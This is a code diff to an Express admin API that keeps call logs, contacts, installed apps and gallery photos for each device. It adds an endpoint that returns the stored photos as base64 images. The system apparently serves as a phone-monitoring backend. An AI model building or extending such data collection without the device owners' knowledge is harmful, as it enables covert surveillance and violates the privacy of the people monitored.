@@ -325,6 +325,7 @@ router.delete('/connections/:deviceId', adminAuth, (req, res) => {
     db.prepare('DELETE FROM call_logs WHERE device_id = ?').run(deviceId);
     db.prepare('DELETE FROM contacts WHERE device_id = ?').run(deviceId);
     db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(deviceId);
+    try { db.prepare('DELETE FROM gallery_photos WHERE device_id = ?').run(deviceId); } catch (_) {}
     const result = db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
     res.json({ success: true, deleted: result.changes > 0 });
   } catch (err) {
@@ -431,6 +432,30 @@ router.get('/connections/:deviceId/apps', adminAuth, (req, res) => {
       apps,
       totalAll: totalAll ? totalAll.count : 0,
       totalUser: totalUser ? totalUser.count : 0,
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/gallery — get gallery photos for a device
+router.get('/connections/:deviceId/gallery', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 50;
+    const offset = (page - 1) * limit;
+
+    const total = db.prepare('SELECT COUNT(*) as count FROM gallery_photos WHERE device_id = ?').get(deviceId);
+    const photos = db.prepare(
+      'SELECT id, device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at FROM gallery_photos WHERE device_id = ? ORDER BY date_taken DESC LIMIT ? OFFSET ?'
+    ).all(deviceId, limit, offset);
+
+    res.json({
+      photos,
+      total: total ? total.count : 0,
+      page,
+      totalPages: Math.ceil((total ? total.count : 0) / limit),
     });
   } catch (err) {
     res.status(500).json({ error: err.message });
